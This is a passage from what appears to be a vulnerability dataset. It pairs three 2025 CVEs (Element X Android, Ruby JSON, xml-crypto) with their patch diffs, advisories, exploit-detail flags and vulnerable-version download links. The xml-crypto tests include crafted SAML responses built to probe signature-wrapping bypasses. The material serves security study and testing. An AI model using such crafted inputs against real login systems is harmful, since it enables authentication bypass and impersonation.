features/call/impl/src/test/kotlin/io/element/android/features/call/utils/CallIntentDataParserTest.kt:\n```\n@@ -45,6 +45,17 @@\nclass CallIntentDataParserTest {\n         doTest(\"http://call.element.io/some-actual-call?with=parameters\", null)\n     }\n \n+    @Test\n+    fun `Element Call urls with unknown host returns null`() {\n+        // Check valid host first, should not return null\n+        doTest(\"https://call.element.io\", \"https://call.element.io#?appPrompt=false&confineToRoom=true\")\n+        // Unknown host should return null\n+        doTest(\"https://unknown.io\", null)\n+        doTest(\"https://call.unknown.io\", null)\n+        doTest(\"https://call.element.com\", null)\n+        doTest(\"https://call.element.io.tld\", null)\n+    }\n+\n     @Test\n     fun `Element Call urls will be returned as is`() {\n         doTest(\n\n@@ -64,7 +75,7 @@\nclass CallIntentDataParserTest {\n     @Test\n     fun `HTTP and HTTPS urls that don't come from EC return null`() {\n         doTest(\"http://app.element.io\", null)\n-        doTest(\"https://app.element.io\", null, testEmbedded = false)\n+        doTest(\"https://app.element.io\", null)\n         doTest(\"http://\", null)\n         doTest(\"https://\", null)\n     }\n\n@@ -193,20 +204,18 @@\nclass CallIntentDataParserTest {\n         )\n     }\n \n-    private fun doTest(url: String, expectedResult: String?, testEmbedded: Boolean = true) {\n+    private fun doTest(url: String, expectedResult: String?) {\n         // Test direct parsing\n         assertThat(callIntentDataParser.parse(url)).isEqualTo(expectedResult)\n \n-        if (testEmbedded) {\n-            // Test embedded url, scheme 1\n-            val encodedUrl = URLEncoder.encode(url, \"utf-8\")\n-            val urlScheme1 = \"element://call?url=$encodedUrl\"\n-            assertThat(callIntentDataParser.parse(urlScheme1)).isEqualTo(expectedResult)\n+        // Test embedded url, scheme 1\n+        val encodedUrl = URLEncoder.encode(url, \"utf-8\")\n+        val urlScheme1 = \"element://call?url=$encodedUrl\"\n+        assertThat(callIntentDataParser.parse(urlScheme1)).isEqualTo(expectedResult)\n \n-            // Test embedded url, scheme 2\n-            val urlScheme2 = \"io.element.call:/?url=$encodedUrl\"\n-            assertThat(callIntentDataParser.parse(urlScheme2)).isEqualTo(expectedResult)\n-        }\n+        // Test embedded url, scheme 2\n+        val urlScheme2 = \"io.element.call:/?url=$encodedUrl\"\n+        assertThat(callIntentDataParser.parse(urlScheme2)).isEqualTo(expectedResult)\n     }\n \n     companion object {\n```\n\nFilename: plugins/src/main/kotlin/Versions.kt:\n```\n@@ -32,7 +32,7 @@\nprivate const val versionYear = 25\n private const val versionMonth = 4\n \n // Note: must be in [0,99]\n-private const val versionReleaseNumber = 1\n+private const val versionReleaseNumber = 2\n \n object Versions {\n     const val VERSION_CODE = (2000 + versionYear) * 10_000 + versionMonth * 100 + versionReleaseNumber\n```",
                "url": "https://github.com/element-hq/element-x-android/commit/dc058544d7e693c04298191c1aadd5b39c9be52e"
            }
        ],
        "published_date": "2025-04-18T15:49:11.899Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nelement-hq\n/\nelement-x-android\nPublic\nNotifications You must be signed in to change notification settings\nFork 215\nStar 1.3k\nCode\nIssues\n432\nPull requests\n15\nActions\nProjects\nSecurity\n3\nInsights\nAdditional navigation options\nElement X Android vulnerable to loading malicious web pages via received intent\nHigh davidegirardi published GHSA-m5px-pwq3-4p5m last monthApr 17, 2025\nPackage\nNo package listed\nAffected versions\n<= 25.04.1\nPatched versions\n25.04.2\nDescription\nImpact\nA crafted hyperlink on a webpage, or a locally installed malicious app, can force Element X up to version 25.04.1 to load a webpage with similar permissions to Element Call and automatically grant it temporary access to microphone and camera.\nEven if the CVSS score is 5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) we consider this issue as a High severity.\nPatches\nFixed in version 25.04.2\nFor more information\nIf you have any questions or comments about this advisory, please email us at security at element.io.\nSeverity\nHigh\nCVE ID\nCVE-2025-27599\nWeaknesses\nCWE-20 CWE-926\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The provided advisory indicates the vulnerability but does not include specific proof of concept code or detailed reproduction steps.",
                "url": "https://github.com/element-hq/element-x-android/security/advisories/GHSA-m5px-pwq3-4p5m"
            }
        ],
        "sw_version": "v25.04.1",
        "sw_version_wget": "https://github.com/element-hq/element-x-android/archive/refs/tags/v25.04.1.zip"
    },
    "CVE-2025-27788": {
        "cwe": [
            {
                "id": "CWE-125",
                "value": "CWE-125: Out-of-bounds Read"
            }
        ],
        "description": "JSON is a JSON implementation for Ruby. Starting in version 2.10.0 and prior to version 2.10.2, a specially crafted document could cause an out of bound read, most likely resulting in a crash. Versions prior to 2.10.0 are not vulnerable. Version 2.10.2 fixes the problem. No known workarounds are available.",
        "languages": [
            "Ruby",
            "Java"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nFix potential out of bound read in `json_string_unescape`.\n\nFilename: CHANGES.md:\n```\n@@ -1,5 +1,6 @@\n# Changes\n \n+* Fix a potential crash in the C extension parser.\n * Raise a ParserError on all incomplete unicode escape sequence. This was the behavior until `2.10.0` unadvertently changed it.\n * Ensure document snippets that are included in parser errors don't include truncated multibyte characters.\n```\n\nFilename: ext/json/ext/parser/parser.c:\n```\n@@ -608,7 +608,7 @@\nstatic VALUE json_string_unescape(JSON_ParserState *state, const char *string, c\n     buffer = RSTRING_PTR(result);\n     bufferStart = buffer;\n \n-    while ((pe = memchr(pe, '\\\\', stringEnd - pe))) {\n+    while (pe < stringEnd && (pe = memchr(pe, '\\\\', stringEnd - pe))) {\n         unescape = (char *) \"?\";\n         unescape_len = 1;\n         if (pe > p) {\n```",
                "url": "https://github.com/ruby/json/commit/c56db31f800d5d508389793e69682f99749dbadf"
            }
        ],
        "published_date": "2025-03-12T13:51:53.348Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nruby\n/\njson\nPublic\nNotifications You must be signed in to change notification settings\nFork 344\nStar 719\nCode\nIssues\n7\nPull requests\n1\nActions\nProjects\nSecurity\n1\nInsights\nAdditional navigation options\nOut-of-bounds Read in Ruby JSON Parser\nHigh byroot published GHSA-9m3q-rhmv-5q44 on Mar 12Mar 12, 2025\nPackage\nbundler json\n(\nRubyGems\n)\nAffected versions\n2.10.0, 2.10.1\nPatched versions\n2.10.2\nDescription\nImpact\nA specially crafted document could cause an out of bound read, most likely resulting in a crash.\nVersions 2.10.0 and 2.10.1 are impacted. Older versions are not.\nPatches\nVersion 2.10.2 fixes the problem.\nWorkarounds\nNone.\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nCVE ID\nCVE-2025-27788\nWeaknesses\nNo CWEs\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not contain details such as example inputs or code snippets to exploit the vulnerability.",
                "url": "https://github.com/ruby/json/security/advisories/GHSA-9m3q-rhmv-5q44"
            }
        ],
        "sw_version": "v2.10.0",
        "sw_version_wget": "https://github.com/ruby/json/archive/refs/tags/v2.10.0.zip"
    },
    "CVE-2025-29775": {
        "cwe": [
            {
                "id": "CWE-347",
                "value": "CWE-347: Improper Verification of Cryptographic Signature"
            }
        ],
        "description": "xml-crypto is an XML digital signature and encryption library for Node.js. An attacker may be able to exploit a vulnerability in versions prior to 6.0.1, 3.2.1, and 2.1.6 to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker to escalate privileges or impersonate another user. Users of versions 6.0.0 and prior should upgrade to version 6.0.1 to receive a fix. Those who are still using v2.x or v3.x should upgrade to patched versions 2.1.6 or 3.2.1, respectively.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* - Draft: see what is signed\n\n* Fix bugs\n\n* Fix bugs\n\n* Revert \"Fix bugs\"\n\nThis reverts commit cd4b7d6fcb21cd1a40e57fd214c950c47c8667d5.\n\n* Revert \"Fix bugs\"\n\nThis reverts commit 0947a89a04e16bedffc3cc5bf3152c6dedbe3a7d.\n\n* Revert \"- Draft: see what is signed\"\n\nThis reverts commit 2a9c405f09f7843b994820f6933408d522a6d849.\n\n* Patch for version 3\n\n* Only parse references from canonicalized signed info\n\n* Space\n\n* Fixing spaces\n\n* remove space\n\n* Remove fix that does not apply\n\n* Formatting\n\n* Add warning about references.\n\n* Remove formatting changes.\n\n* Backport references, SignedInfo, and DigestValue patches.\n\n* Only allow exclusive canon.\n\n* Apply changes from v6 review\n\n* Revert package-lock.json\n\n* Apply suggested changes\n\n---------\n\nCo-authored-by: SecureSAML <alex@securesaml.com>\nCo-authored-by: Blair Weber <blair@workos.com>\n\nFilename: lib/signed-xml.js:\n```\n@@ -362,6 +362,46 @@\nSignedXml.prototype.checkSignature = function (xml, callback) {\n \n   var doc = new Dom().parseFromString(xml);\n \n+  // Reset the references as only references from our re-parsed signedInfo node can be trusted\n+  this.references = [];\n+\n+  const unverifiedSignedInfoCanon = this.getCanonSignedInfoXml(doc);\n+  if (!unverifiedSignedInfoCanon) {\n+    if (callback) {\n+      callback(new Error(\"Canonical signed info cannot be empty\"));\n+      return;\n+    }\n+\n+    throw new Error(\"Canonical signed info cannot be empty\");\n+  }\n+\n+  // unsigned, verify later to keep with consistent callback behavior\n+  const parsedUnverifiedSignedInfo = new Dom().parseFromString(unverifiedSignedInfoCanon, \"text/xml\");\n+\n+  const unverifiedSignedInfoDoc = parsedUnverifiedSignedInfo.documentElement;\n+  if (!unverifiedSignedInfoDoc) {\n+    if (callback) {\n+      callback(new Error(\"Could not parse signedInfoCanon into a document\"));\n+      return;\n+    }\n+\n+    throw new Error(\"Could not parse signedInfoCanon into a document\");\n+  }\n+\n+  const references = utils.findChilds(unverifiedSignedInfoDoc, \"Reference\");\n+  if (references.length === 0) {\n+    if (callback) {\n+      callback(new Error(\"could not find any Reference elements\"));\n+      return;\n+    }\n+\n+    throw new Error(\"could not find any Reference elements\");\n+  }\n+\n+  for (const reference of references) {\n+    this.loadReference(reference);\n+  }\n+\n   if (!this.validateReferences(doc)) {\n     if (!callback) {\n       return false;\n\n@@ -371,6 +411,7 @@\nSignedXml.prototype.checkSignature = function (xml, callback) {\n     }\n   }\n \n+  // Stage B: Take the signature algorithm and key and verify the SignatureValue against the canonicalized SignedInfo\n   if (!callback) {\n     // Synchronous flow\n     if (!this.validateSignatureValue(doc)) {\n\n@@ -394,7 +435,14 @@\nSignedXml.prototype.checkSignature = function (xml, callback) {\n \n SignedXml.prototype.getCanonSignedInfoXml = function (doc) {\n   var signedInfo = utils.findChilds(this.signatureNode, \"SignedInfo\");\n-  if (signedInfo.length == 0) throw new Error(\"could not find SignedInfo element in the message\");\n+  if (signedInfo.length == 0) { \n+    throw new Error(\"could not find SignedInfo element in the message\");\n+  }\n+  if (signedInfo.length > 1) {\n+    throw new Error(\n+      \"could not get canonicalized signed info for a signature that contains multiple SignedInfo nodes\"\n+    );\n+  }\n \n   if (\n     this.canonicalizationAlgorithm === \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" ||\n\n@@ -477,7 +525,7 @@\nSignedXml.prototype.validateReferences = function (doc) {\n \n     var ref = this.references[r];\n \n-    var uri = ref.uri[0] == \"#\" ? ref.uri.substring(1) : ref.uri;\n+    var uri = ref.uri ? (ref.uri[0]==\"#\" ? ref.uri.substring(1) : ref.uri) : \"\";\n     var elem = [];\n \n     if (uri == \"\") {\n\n@@ -594,11 +642,43 @@\nSignedXml.prototype.loadSignature = function (signatureNode) {\n     \".//*[local-name(.)='SignatureMethod']/@Algorithm\"\n   ).value;\n \n-  this.references = [];\n-  var references = xpath.select(\n-    \".//*[local-name(.)='SignedInfo']/*[local-name(.)='Reference']\",\n-    signatureNode\n+  const signedInfoNodes = utils.findChilds(this.signatureNode, \"SignedInfo\");\n+  if (signedInfoNodes.length == 0) {\n+    throw new Error(\"no signed info node found\");\n+  }\n+  if (signedInfoNodes.length > 1) {\n+    throw new Error(\"could not load signature that contains multiple SignedInfo nodes\");\n+  }\n+\n+  // Try to operate on the c14n version of signedInfo. This forces the initial getReferences()\n+  // API call to always return references that are loaded under the canonical SignedInfo\n+  // in the case that the client access the .references **before** signature verification.\n+\n+  // Ensure canonicalization algorithm is exclusive, otherwise we'd need the entire document\n+  let canonicalizationAlgorithmForSignedInfo = this.canonicalizationAlgorithm;\n+  if (\n+    !canonicalizationAlgorithmForSignedInfo ||\n+    canonicalizationAlgorithmForSignedInfo ===\n+      \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" ||\n+    canonicalizationAlgorithmForSignedInfo ===\n+      \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments\"\n+  ) {\n+    canonicalizationAlgorithmForSignedInfo = \"http://www.w3.org/2001/10/xml-exc-c14n#\";\n+  }\n+  \n+  const temporaryCanonSignedInfo = this.getCanonXml(\n+    [this.canonicalizationAlgorithm || \"http://www.w3.org/2001/10/xml-exc-c14n#\"],\n+    signedInfoNodes[0]\n   );\n+  const temporaryCanonSignedInfoXml = new Dom().parseFromString(\n+    temporaryCanonSignedInfo,\n+    \"text/xml\"\n+  );\n+  const signedInfoDoc = temporaryCanonSignedInfoXml.documentElement;\n+\n+  this.references = [];\n+  \n+  const references = utils.findChilds(signedInfoDoc, \"Reference\");\n   if (references.length == 0) throw new Error(\"could not find any Reference elements\");\n \n   for (var i in references) {\n\n@@ -632,10 +712,17 @@\nSignedXml.prototype.loadReference = function (ref) {\n   nodes = utils.findChilds(ref, \"DigestValue\");\n   if (nodes.length == 0)\n     throw new Error(\"could not find DigestValue node in reference \" + ref.toString());\n-  if (nodes[0].childNodes.length == 0 || !nodes[0].firstChild.data) {\n-    throw new Error(\"could not find the value of DigestValue in \" + nodes[0].toString());\n+  \n+  if (nodes.length > 1) {\n+    throw new Error(\n+      `could not load reference for a node that contains multiple DigestValue nodes: ${ref.toString()}`\n+    );\n+  }\n+\n+  const digestValue = nodes[0].textContent;\n+  if (!digestValue) {\n+    throw new Error(`could not find the value of DigestValue in ${ref.toString()}`);\n   }\n-  var digestValue = nodes[0].firstChild.data;\n \n   var transforms = [];\n   var inclusiveNamespacesPrefixList;\n\n@@ -688,11 +775,12 @@\nSignedXml.prototype.loadReference = function (ref) {\n     transforms.push(\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\");\n   }\n \n+  const refUri = ref.getAttribute(\"URI\") || undefined;\n   this.addReference(\n     null,\n     transforms,\n     digestAlgo,\n-    utils.findAttr(ref, \"URI\").value,\n+    refUri,\n     digestValue,\n     inclusiveNamespacesPrefixList,\n     false\n```\n\nFilename: test/saml-response-test.js:\n```\n@@ -93,3 +93,76 @@\nexports[\"test validating SAML response WithComments\"] = function (test) {\n   test.equal(result, false);\n   test.done();\n };\n+\n+exports[\"test validating SAML response with digest comment\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/valid_saml_with_digest_comment.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  const assertion = xpath.select1(\"//*[local-name(.)='Assertion']\", doc);\n+  const signature = xpath.select1(\n+    \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    assertion,\n+  );\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/feide_public.pem\");\n+  sig.loadSignature(signature);\n+  var result = sig.checkSignature(xml);\n+  test.equal(sig.references[0].digestValue, \"RnNjoyUguwze5w2R+cboyTHlkQk=\");\n+  test.equal(result, false);\n+  test.done();\n+};\n+\n+exports[\"test signature contains a `SignedInfo` node\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/invalid_saml_no_signed_info.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  const node = xpath.select1(\n+    \"/*/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    doc,\n+  );\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/feide_public.pem\");\n+  test.throws(\n+    function () {\n+      sig.loadSignature(node);\n+    },\n+    Error,\n+    \"no signed info node found\"\n+  );\n+  test.done();\n+};\n+\n+exports[\"test validation ignores an additional wrapped `SignedInfo` node\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/saml_wrapped_signed_info_node.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  var assertion = xpath.select(\"//*[local-name(.)='Assertion']\", doc)[0];\n+  var signature = xpath.select(\n+    \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    assertion\n+  )[0];\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/saml_external_ns.pem\");\n+  sig.loadSignature(signature);\n+  test.equal(sig.references.length, 1);\n+  var result = sig.checkSignature(xml);\n+  test.equal(result, true);\n+  test.done();\n+};\n+\n+exports[\"test signature does not contain multiple `SignedInfo` nodes\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/saml_multiple_signed_info_nodes.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  var assertion = xpath.select(\"//*[local-name(.)='Assertion']\", doc)[0];\n+  var signature = xpath.select(\n+    \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    assertion\n+  )[0];\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/saml_external_ns.pem\");\n+  test.throws(\n+    function () {\n+      sig.loadSignature(signature);\n+    },\n+    Error,\n+    \"could not load signature that contains multiple SignedInfo nodes\"\n+  );\n+  test.done();\n+};\n```\n\nFilename: test/static/invalid_saml_no_signed_info.xml:\n```\n@@ -0,0 +1,9 @@\n+<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"pfx94e4a319-b6f7-4a40-25d1-01fcb642e4c5\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\" Destination=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:SignatureValue>dkONrkxW+LSuDvnNMG/mWYFa47d2WGyapLhXSTYqrlT9Td+tT7ciojNJ55WTaPaCMt7IrGtIxxskPAZIjdIn5pRyDxHr0joWxzZ7oZHCOI1CnQV5HjOq+rzzmEN2LctCZ6S4hbL7SQ1qJ3vp2BCXAygy4tmJOURQdnk0KLwwRS8=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfx66496e6c-3c29-230d-6d47-b245434b872d\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:Reference URI=\"#pfx66496e6c-3c29-230d-6d47-b245434b872d\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>RnNjoyUguwze5w2R+cboyTHlkQk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>aw5711jKP7xragunjRRCAD4mT4xKHc37iohBpQDbdSomD3ksOSB96UZQp0MtaC3xlVSkMtYw85Om96T2q2xrxLLYVA50eFJEMMF7SCVPStWTVjBlaCuOPEQxIaHyJs9Sy3MCEfbBh4Pqn9IJBd1kzwdlCrWWjAmksbFFg5wHQJA=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"passport-saml\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">_6c5dcaa3053321ff4d63785fbc3f67c59a129cde82</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2012-07-03T11:37:20Z\" Recipient=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2012-07-03T11:31:50Z\" NotOnOrAfter=\"2012-07-03T11:37:20Z\"><saml:AudienceRestriction><saml:Audience>passport-saml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2012-07-03T11:32:20Z\" SessionNotOnOrAfter=\"2012-07-03T19:32:20Z\" SessionIndex=\"_c8e6823fe38ddbce125f9be6e5118b8c352d04bcae\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"givenName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"sn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"cn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonPrincipalName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonTargetedID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.6\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>\n```\n\nFilename: test/static/saml_multiple_signed_info_nodes.xml:\n```\n@@ -0,0 +1 @@\n+<?xml version=\"1.0\"?><samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" 